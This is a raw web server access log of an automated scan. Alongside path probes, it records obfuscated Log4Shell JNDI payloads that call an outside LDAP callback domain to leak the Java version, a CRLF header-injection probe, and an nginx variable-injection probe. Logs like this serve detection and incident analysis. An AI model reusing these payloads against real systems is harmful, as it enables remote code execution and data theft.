34.68.34.66 - - [16/Feb/2024:04:05:25 +0000] "GET /swagger/ HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:25 +0000] "GET / HTTP/1.1" 200 2640 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:25 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:25 +0000] "GET /nginx-status HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:26 +0000] "GET /.htaccess.bak HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:26 +0000] "GET / HTTP/1.1" 200 2640 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:26 +0000] "GET /swagger-resources HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:26 +0000] "GET / HTTP/1.1" 200 2640 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:26 +0000] "GET / HTTP/1.1" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:26 +0000] "GET /${${np:z:b:-j}${d:p9g:-n}${qu59:xh0a:-d}${8x:-i}${zcq:fwzm:-:}${hyf8:-l}${i7lg:ay:q0r:-d}${j0be:-a}${jlz:kzor:-p}${o:-:}${h1f:np4:t:-/}${4:7s:h7:-/}${w2:j:-P}${ylx:-A}${4:-l}${qfx0:-0}${j0o:1kj:-c}${f:jcne:dyl:--}${${l:ouv:2s:-s}${a:-y}${x9:h:d:-s}${4d:-:}${spy:-j}${ke:-a}${vc8:-v}${d3hw:-a}${xh8v:kx1v:qhy:-.}${2a:-v}${g1:-e}${pgd:ks:-r}${rb:q1iv:r2l9:-s}${3js:bk:9:-i}${x09:-o}${y2up:aj:c:-n}}${xh5v:c2f0:-.}${9zq:t:3v:-9}${mpw:h:sami:-0}${h59k:i:-1}${sl7:-d}${vy:i:v2:-9}${sx:d:-3}${qy7:-8}${thpy:-c}${a:x8q4:7hv3:-9}${5xag:t9:-0}${wby:i:-b}${l:ju:-2}${9o1:op4:-2}${l9f:-d}${b8:j:fjkh:-b}${4:-e}${esf:vfd:-9}${1lvy:uc:-d}${n:mtp4:2:-f}${t0rg:-2}${rld:0:13:-2}${hzi:dy9:-a}${nr68:e:8f:-b}${06zd:a9:-a}${04ba:-9}${sdry:9yu:-4}${8:-3}${w9f:1k4u:ft:-c}${oa:n6:l:-6}${0:-d}${5:-a}${xzh:-b}${ym6:-3}${j1bm:zypr:h8w:-3}${yup:-8}${nt:g9w6:ru1:-f}${9:-d}${zq29:-9}${rlz:tkhp:-0}${y:-e}${1s4c:-2}${38h:-a}${jmf:-.}${y32:p:-z}${nw0a:-.}${r0:6:60ae:-7}${zr:gi:07oj:-b}${w49f:m:q:-a}${9i8j:qp:-e}${ap4v:kf:4zkn:-.}${q:01m:y:-x}${dfp:rkt:d2tq:-y}${i:q:-z}} HTTP/1.1" 404 207 "-" "${${mys8:-j}${se1:-n}${i4:roe8:t8ju:-d}${7k:y9z:-i}${7:-:}${qv:32:-l}${sryg:-d}${v:3tmx:-a}${64:7hs1:hr:-p}${2k:xz:-:}${1wdm:w4:-/}${b:-/}${w:4jm:-U}${lt:-A}${g4s:-l}${1:et:j:-0}${lcq:-c}${m:206:2lrk:--}${${s3w:mdpx:l7d:-s}${bax:2:-y}${vph5:-s}${834:wf:vtr:-:}${9qmx:9:-j}${tud6:-a}${jd1:uv6:-v}${z5:p3:-a}${ts6o:kpw:k:-.}${7b:6w:64h:-v}${us19:yw:-e}${zex:-r}${ut64:-s}${wlvn:e:8x:-i}${scnl:-o}${eq:r9:pai:-n}}${ovj:-.}${w:-9}${vd:en9t:-0}${0:y:v6:-1}${q:-d}${v5:z96p:-9}${b5s:c2pb:-3}${4aiw:-8}${z4ow:u5x0:en4o:-c}${e:ai6:-9}${1gi4:-0}${nzq:nzp:4:-b}${b3:-2}${26:-2}${p2w:-d}${i:z:z3n:-b}${mq1k:w:oc:-e}${78u:-9}${dpu:8:-d}${gw:i4o:-f}${9td:k:-2}${m5l:-2}${qvi:z:-a}${fxr7:ufn:-b}${yqw:-a}${zrma:std5:-9}${l:i:vq:-4}${q8:u9ti:-3}${h80:e0d:-c}${va:-6}${92bo:y:-d}${fzdq:kfc:gw3e:-a}${xw:-b}${ja:-3}${dc:-3}${cgyu:k10:-8}${p1:-f}${9v:0vb:0b:-d}${n:lrt:rq76:-9}${f92:1gte:-0}${fa:-e}${1:-2}${o19:a6:8f:-a}${s8tl:-.}${o:-z}${o:dxz:-.}${a:4vl:u85:-7}${17:v:lp2:-b}${es6:i7h2:g0j5:-a}${e:yt:-e}${vxrg:vw13:-.}${qr:-x}${78r:3:wr2:-y}${oiz:fi:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:26 +0000] "POST / HTTP/1.1" 403 146 "${${9v:7j3e:-j}${7:u3g:-n}${m:-d}${h:-i}${8tb:7h6:-:}${z:gf:w:-l}${3ty1:m:vu:-d}${kf:wl:nq2:-a}${9j:tr:vls2:-p}${pc:-:}${we:-/}${iof:sp:hexg:-/}${g:ez4:kb7z:-R}${10:-E}${n:a4wv:56:-l}${6:-0}${p:-c}${l8:k2:w:--}${${z:y:w9:-s}${y8bx:g:d5:-y}${zd6:u7f:q:-s}${h2sz:-:}${sep:wg:g:-j}${2ho:-a}${fx:rq0:-v}${kw:e:7:-a}${731n:d:-.}${abi:6r:-v}${ze:dy4i:-e}${ym:-r}${16us:3mk:-s}${up2s:omp:wqd:-i}${oc0s:g:-o}${pns:-n}}${m7fo:0s:c9xi:-.}${use:-f}${h:-7}${w:8l9o:mx:-a}${kd:5wb:-0}${pxa0:lgrq:g47:-7}${o:-d}${7:-d}${reo9:sdij:-a}${80:9f:ju1q:-6}${pd:-f}${fvo4:-7}${g2um:-a}${ym7p:xg:-a}${c8:beky:-e}${qrf:-6}${m4:5axz:-d}${vi:-0}${if:plc9:4vz:-5}${3jn:-1}${l4s:7:-4}${i3:-4}${ha14:-7}${at0s:-7}${yuq:mn:3zai:-0}${hzjs:-2}${1w:-e}${x4t:s4:561:-1}${8p:-c}${jf:-9}${f:2:vzph:-c}${ez:42q:-a}${1s:a9:u:-3}${kl:w:-3}${f:49v:-3}${97:-8}${im0:gw:-f}${tbu:-d}${12b4:-9}${6hsq:9zyl:-0}${2v:-e}${1t4f:-2}${6:asr:e:-a}${z3:q:hi:-.}${rxl:ab6:ku6:-z}${xj:-.}${shat:hjo:5yob:-7}${bg:-b}${gi3:9:4st:-a}${dih2:wsou:-e}${7ct2:wya:291:-.}${m4:4jg:-x}${q7:r:9:-y}${5zc:db3e:s04:-z}}" "${${k:-j}${alr:-n}${sw80:foe:-d}${byq:-i}${v27:t1:-:}${e34r:p:-l}${l:wg:-d}${pe23:-a}${xaem:-p}${ka6s:-:}${y:ng:guk3:-/}${gl:a7:-/}${18oc:-U}${r5yi:-A}${i89:x:we:-l}${pg:4els:8:-0}${c:v:on4:-c}${n:3s:--}${${s:89u6:-s}${vr5j:uw:-y}${j8dl:1t2:-s}${d4:53ky:-:}${nu59:6si:-j}${5:j:-a}${e:v:-v}${icp:-a}${z5:fwt:x:-.}${xb27:-v}${dxmz:e8t0:w:-e}${lzgx:v:30h:-r}${kj3:nrci:owr6:-s}${f:9gr:1:-i}${1psd:-o}${er:-n}}${r4sj:6xyt:0vj:-.}${s:eom:-f}${sv:c1:-7}${ui:t:-a}${6tq:bv:-0}${f:-7}${m:4va:-d}${6c:jp:-d}${9k:-a}${49ez:ur:-6}${t:-f}${vdo6:32j:-7}${r2a6:b:-a}${9:st:0um:-a}${m6un:ob:-e}${pj8u:v:u0:-6}${hli:-d}${xvot:-0}${iy:-5}${tnoc:d5:-1}${ugo:t:-4}${t2c:6b:-4}${zw:qf:t:-7}${d:f:i5pe:-7}${xi:s:75:-0}${npab:as8:-2}${9yt:1zie:c:-e}${4p:sfp5:d0:-1}${b93p:-c}${cg65:-9}${059c:am8:8mr:-c}${q:l84:k879:-a}${1p:vh6w:-3}${v:-3}${4:3q:uy:-3}${1rha:-8}${gxao:xf8v:-f}${rcog:-d}${r:h:wk4l:-9}${n5d:zs:-0}${w:-e}${mxw:mb:xmo5:-2}${xr1:-a}${dx6c:-.}${l4o:-z}${fr:o:6gvt:-.}${5vgo:-7}${bm:dj2u:-b}${w3fm:y:6rb5:-a}${s:el:-e}${1:r:e9:-.}${s:-x}${f:-y}${d:r:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:26 +0000] "GET /swagger-ui HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:27 +0000] "GET /${${g2nv:kmb9:v7:-j}${rs:no:ojlf:-n}${r8wc:-d}${ue7:-i}${ib:-:}${w:0q89:-l}${z:-d}${tr:liz:-a}${nlv:-p}${p:i:8r:-:}${rg:10j2:-/}${w3:ub6:-/}${re:kp:j1:-P}${vya4:1:eg:-A}${f1ng:kr5:-l}${g:halo:ezkg:-0}${nc4a:g58r:drm:-c}${o:w92r:s0:--}${${pj:z:-s}${5s:-y}${s16w:-s}${ugaf:-:}${16t3:i:-j}${0d:ig:khp:-a}${bg:dhcz:-v}${90:lqza:n:-a}${se:q:8gz:-.}${pgul:-v}${wo32:mz:kz6h:-e}${qkc:x:-r}${0s:pt9:-s}${v:3:-i}${3:q6l:q:-o}${8:ewq:7w9y:-n}}${2l:562:atn:-.}${u:-f}${e3:1m:om:-7}${rd20:bz:gebt:-a}${i4t:yd:-0}${jyi0:9bn:-7}${h:y6:-d}${aj:1:7:-d}${1wo:pvy:-a}${h9au:-6}${oi:sfn:o:-f}${m:u:-7}${iso:qt96:ts:-a}${ev:9:-a}${r:5:5p:-e}${dnu:uwn:-6}${vr:-d}${vj:u:lu:-0}${0q7:-5}${2j:o:2uhf:-1}${hvwc:pw37:0x:-4}${t:-4}${osr:4zr1:imre:-7}${u9vj:oje9:-7}${e0c:i20:-0}${5k:4f:-2}${mc:-e}${z:-1}${5zg6:tyd:g:-c}${yx:40:du1l:-9}${q:7yd:w:-c}${3zg0:-a}${m9:-3}${y:k7o:9in:-3}${oy:-3}${rx:-8}${hsl:p:h9:-f}${qr:zs:-d}${37:4r82:l:-9}${6:tnu2:-0}${uyld:-e}${bxo:d5s:e3:-2}${m:-a}${6c:h:n7s2:-.}${tu:dn:1apz:-z}${kz49:xrh:-.}${cr:r:j:-7}${w:dy:-b}${nz:vmju:-a}${nvl:ryij:vpm:-e}${qjp:s:-.}${fpq:8un:kvuh:-x}${v:swoz:s:-y}${gb6:-z}} HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:27 +0000] "GET / HTTP/1.1" 200 2640 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:27 +0000] "GET /${${k:-j}${vu0:g:-n}${c2:-d}${0qu:etgb:-i}${r:-:}${knuz:07om:-l}${0rpk:-d}${f:mg1:-a}${kvie:-p}${m4:2:uom:-:}${hz:my:2uy:-/}${tao:-/}${2:9j:-P}${n:k:-A}${h:iz81:-l}${d:rsik:-0}${2l:pfro:w:-c}${kh1:--}${${z:q:qced:-s}${lkb1:-y}${05i:f:yk:-s}${zo:-:}${3qn:-j}${xlh1:-a}${d30j:6y:c7:-v}${5uat:ai:-a}${zlg:-.}${f0:-v}${5o6y:-e}${cf2:abps:-r}${f61:1d2:08:-s}${q3h:skwv:lqs:-i}${mi:ipge:-o}${jxp:-n}}${ksp:7:-.}${ia:2cjl:p7qb:-f}${hd:h:-7}${z65u:-a}${1:esw4:-0}${id:nx:wh8:-7}${9:-d}${ert:9h:s:-d}${rf3:-a}${rg61:9w:1q6:-6}${i:rjub:k3v:-f}${5:ky:-7}${crk:-a}${sip1:lm:syr:-a}${p1fb:-e}${v:-6}${s2w:4:siq:-d}${f85:9ht5:-0}${5:-5}${y9z7:cmus:h:-1}${cl0:aiv:hy:-4}${n:k85s:-4}${5:-7}${oz7q:-7}${6nr:-0}${urd:-2}${lm9:-e}${pow:zax:b20:-1}${r1g:z9l4:urjz:-c}${5:alk2:-9}${lh:kq:zhbu:-c}${a6b:m29:-a}${3tgs:-3}${ae2:-3}${quyf:y:2:-3}${5hl:0e:-8}${965y:l:b:-f}${a3:-d}${oxsg:phl:t:-9}${s7:k:k72e:-0}${d:5f:-e}${2:-2}${hw:0nmg:ml:-a}${h13n:-.}${c:1vle:n:-z}${6o7m:p3x1:-.}${b4:03:-7}${gw:1:h:-b}${4:n1:boq6:-a}${d:-e}${x3e0:8:1ls6:-.}${ng2:f:u1j3:-x}${3p:-y}${37z:vn61:i:-z}} HTTP/1.1" 404 146 "-" "${${4:-j}${30sr:7bo:r:-n}${r1a:-d}${f:8br:au:-i}${gtxy:qwb0:qf4:-:}${a9:e6kb:lr:-l}${z9:e90:-d}${zwxq:-a}${8po:n:o:-p}${29:kipn:vsah:-:}${h3q:-/}${o0:-/}${ewr3:-U}${sz:om7:o:-A}${2:8ri:-l}${pf3:-0}${s:s0u:0b21:-c}${bi:gnj:g8t:--}${${co:2:4u:-s}${uvx:o:bz:-y}${ajr:85ud:-s}${mle:-:}${g:f1s:-j}${r6:-a}${3a:t:4s1a:-v}${g4:e:fg4o:-a}${ojpr:q:xv:-.}${y:-v}${3x:-e}${2d:-r}${1:v:sni:-s}${0xo:-i}${12ov:0p:-o}${6:xmt:-n}}${1gp0:7wo:42c:-.}${qmxw:-f}${7u:-7}${rsti:x:9:-a}${ru:cu:end:-0}${ae:hkt:s1y:-7}${1v:kwp:-d}${ve:g:-d}${xe:-a}${ms:wb:xv:-6}${6v1:53f:c4af:-f}${fg:-7}${p:-a}${e:2:-a}${y0o:-e}${2h7:u2gp:3ua:-6}${0wk:zng:7:-d}${4ur6:udbc:3lvu:-0}${lpgm:2:-5}${g:-1}${xwe8:1s:6ux:-4}${6ox1:z:-4}${wi30:3:nt2:-7}${2:-7}${n:u:-0}${q:0l7:-2}${e:tym:-e}${oxz8:v:dj:-1}${8xf:-c}${wtf:uy:ehvo:-9}${u:-c}${52:-a}${s:rz3:dbl:-3}${b:pzoh:wh:-3}${da1:-3}${t:qhy5:rx:-8}${dw:2le:-f}${1p0:-d}${8:-9}${z6a:-0}${5:-e}${q2k8:dlr:ksp:-2}${ls:ubp:1gh:-a}${2sp6:-.}${c2d:zo:-z}${6:vbj:6h:-.}${4:23j:p2rj:-7}${1dpr:-b}${1:s8:-a}${ml:6jzg:-e}${2:785:rnxo:-.}${4vx:n:lua:-x}${e:0zc9:-y}${8xyh:f:-z}}"
34.200.239.31 - - [16/Feb/2024:04:05:27 +0000] "GET / HTTP/1.1" 403 146 "-" "Typhoeus - https://github.com/typhoeus/typhoeus"
34.68.34.79 - - [16/Feb/2024:04:05:27 +0000] "ZSDLKFJ2 /${${tnjq:e:yiz5:-j}${xip9:p0t:-n}${qc:qt2:32m:-d}${2:mt1c:ry5:-i}${m7:-:}${4:vwp7:sepx:-l}${g:aw6:-d}${9:-a}${hqvt:o:-p}${3:-:}${5jc:w:v:-/}${1sy:-/}${kgny:i:b9k:-P}${v:-A}${mhp7:f0r:-l}${m:ahb7:u0so:-0}${45:-c}${6:g3:--}${${ga1:uh0:-s}${t:vc:adg:-y}${0:orvf:-s}${t:8uo:we:-:}${cpw:3:-j}${l94:-a}${vs:a:-v}${2y:v:-a}${hjx:-.}${ust:h1u:-v}${y:yg:ma:-e}${4qfi:t:zqu:-r}${n:kv:-s}${jlp:6:6:-i}${3h:-o}${j:-n}}${u:1:k4qn:-.}${djah:-9}${mgl:w24x:-0}${d:-1}${oc:a0p:-d}${op:l7:ud:-9}${u:-3}${7swq:z:jvd:-8}${h:v97j:ob:-c}${w:-9}${6:-0}${xvf:-b}${m589:-2}${qt5a:n:oe7:-2}${hio:489q:-d}${7:n4:9j:-b}${z2:-e}${pjt7:a:s4yr:-9}${l3:-d}${ut:7:gw:-f}${za:yu5:-2}${6mlb:4:-2}${yr:u1:-a}${mb3j:l:-b}${tz:rvs:ud:-a}${k:l5e:p:-9}${aq6:-4}${3:lj78:-3}${cgd:-c}${w:ov:-6}${z:v:9d:-d}${j:ekqa:-a}${in:k:v3o8:-b}${j:0au6:zu:-3}${6k:07yp:0fe4:-3}${z:ys:4xz8:-8}${6su:87w2:dq:-f}${mn:r2:is3q:-d}${90an:48:b:-9}${5pm6:-0}${p:-e}${r:h3:tge:-2}${jg71:qp:fcu6:-a}${t:-.}${p:-z}${4q:3r5:-.}${vkgo:vr:ajb:-7}${e6uw:4:-b}${w:0e:g:-a}${h:u:-e}${" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:27 +0000] "GET /swagger-ui.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:28 +0000] "ZSDLKFJ2 /${${gf:aiw:6oae:-j}${2l9:mwd:-n}${tos8:-d}${4kt:-i}${k:-:}${i1tf:-l}${wf:7:-d}${bh0:y:y:-a}${ovb:lc3w:-p}${5918:xuh8:-:}${tbzc:5ri:-/}${p:v:-/}${re3:izg:-P}${4u:-A}${i:-l}${in:a:-0}${zk:n:v:-c}${qj0k:s:cgj:--}${${nl:-s}${x7e:u:-y}${uk:-s}${ji:2k:-:}${0r7:-j}${j2:b:-a}${9y1u:yf:-v}${z4:2:-a}${id:-.}${b:xen:-v}${zn:v:-e}${za02:8:irh:-r}${bl1q:cj:-s}${h:9ha:-i}${rn:y7q:-o}${tqv5:-n}}${ha:ek1:n:-.}${fl:5:-f}${bt:z6lj:ipy:-7}${7z:0lsm:-a}${q0:-0}${0v:-7}${ek0f:cs:usk:-d}${ael3:b:-d}${v20:lo6g:g:-a}${ydvp:zw:-6}${hx1s:je:0zk8:-f}${a70n:y0v:-7}${9:iy:428d:-a}${m6js:j:c:-a}${x:lj0s:c36x:-e}${nvh:2ti:-6}${m07:-d}${pv:yl5i:-0}${9:m:-5}${k:w7s:58b:-1}${zco:i3:-4}${6e9h:-4}${6j7:-7}${gq0:hj78:g:-7}${gh:1qt:-0}${swk:-2}${b5:plky:j:-e}${lait:-1}${oh:7:-c}${4z9:-9}${9fw:d7f9:-c}${a:a8:izl:-a}${g5:ur7:-3}${lh:r06:-3}${4sk:-3}${5:a0eu:-8}${i:ycqd:acdp:-f}${c3ra:et9p:7x:-d}${w5qn:iwr:-9}${9:w:f57e:-0}${803v:-e}${t2:8b:-2}${2ly:50mn:-a}${e5:ty:-.}${3jr:mu:-z}${ingh:j0ed:-.}${zw:l:8:-7}${cozy:8n5:u91:-b}${r6z:d8:mk:-a}" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:28 +0000] "GET /swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:28 +0000] "\x804\x01\x00\x02\x00\x1B\x00\x00\x00\x10\x05\x00\x80\x03\x00\x80\x01\x00\x80\x07\x00\xC0\x08\x00\x80\x06\x00@\x04\x00\x80\x02\x00\x80\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:28 +0000] "GET /%0d%0aReflected-Header:%20674135b1b90752297571605ceea9adc0 HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "GET /swagger/index.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "\x16\x03\x00\x00\xE8\x01\x00\x00\xE4\x03\x00" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "GET /zzz$http_referer HTTP/1.1" 404 548 "dbb905ced34d96ecb475285b30f9ee35" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "PUT /${${u:-j}${cup:o:-n}${z832:l0:-d}${j0ls:aw:-i}${g2u:yu:lmxf:-:}${kbi7:5:6y:-l}${zwcl:i6qf:-d}${0tr6:-a}${14:3t:nq:-p}${8:ald:drsz:-:}${v:a:l:-/}${kw:urov:ijf:-/}${vr:6:-P}${y:t4:c0yg:-A}${654x:jyi7:-l}${lg:-0}${45:-c}${d:--}${${ahq0:8:-s}${gj:-y}${6r:xg6:xmwo:-s}${l:od:-:}${y:-j}${9:-a}${s0:r:-v}${dhxo:4:-a}${ird1:-.}${j:jln:z2:-v}${4ji:9i:-e}${vm0:-r}${rv26:-s}${bp:-i}${lr:-o}${1a:-n}}${a7r8:av:gf:-.}${m9jx:-f}${fq6:9:-7}${e1o:y0:rmx:-a}${l:bo6l:-0}${gxnp:voey:-7}${mn:-d}${os:2rnl:3f:-d}${gi5y:0p:-a}${u3if:4:sf:-6}${uea:-f}${w4d:-7}${mgq:9u2z:-a}${7sq:sy:0y:-a}${iut:-e}${d:gzl9:-6}${oh:30vl:-d}${52u:ynb:8t:-0}${a45:5z:1z:-5}${v:z8:8abj:-1}${d:y:-4}${t6:nrse:swz2:-4}${wokq:2p:grb:-7}${6y1:li6g:yue8:-7}${p:nq15:-0}${za:m3kn:-2}${ph3l:c:3:-e}${zj:an45:ea9:-1}${bei:q:l:-c}${db46:arvc:-9}${pr30:-c}${8:xb2f:-a}${ygzj:-3}${e0kb:1h:-3}${5dkz:-3}${cp1s:yz:z1:-8}${1:-f}${5q:ea9:4amt:-d}${4s7:ft:-9}${9:zi5:d0t:-0}${2:-e}${r:r:-2}${h:-a}${hr:rg:-.}${9n8g:-z}${6qo:h:6v:-.}${9yj:-7}${z:6u:-b}${ay:c:6y:-a}${p:v:b:-e}${n:nks:4ne:-.}${lf3:jc:ql2:-x}${u3:lca8:-y}${v:-z}} HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "\x16\x03\x01\x03\x8F\x01\x00\x03\x8B\x03\x01e\xCE\xDF\x09W\xEF\x10\xA4J\x10B>:1s\xD8+R\xA4r)s\xD5\x0C(\x94\x06\xA7$\xB57A \x19\xD6h\xDB\x0B\xF7\x99u\xFE\x17\xCB\x0F\xEE8\xFC\xA9\xDFY-D\xDDz^\xDE\xDC\x9B\x8Fx\xD8\xBC\xC0\x12\x02\xB2\x00\x00\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x06\x00\x07\x00\x08\x00\x09\x00" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "GET /status HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:29 +0000] "GET /swagger/swagger-ui.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:30 +0000] "\x16\x03\x02\x03\x8F\x01\x00\x03\x8B\x03\x02e\xCE\xDF\x09W\xEF\x10\xA4J\x10B>:1s\xD8+R\xA4r)s\xD5\x0C(\x94\x06\xA7$\xB57A \x19\xD6h\xDB\x0B\xF7\x99u\xFE\x17\xCB\x0F\xEE8\xFC\xA9\xDFY-D\xDDz^\xDE\xDC\x9B\x8Fx\xD8\xBC\xC0\x12\x02\xB2\x00\x00\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x06\x00\x07\x00\x08\x00\x09\x00" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:30 +0000] "GET /nginx-status HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
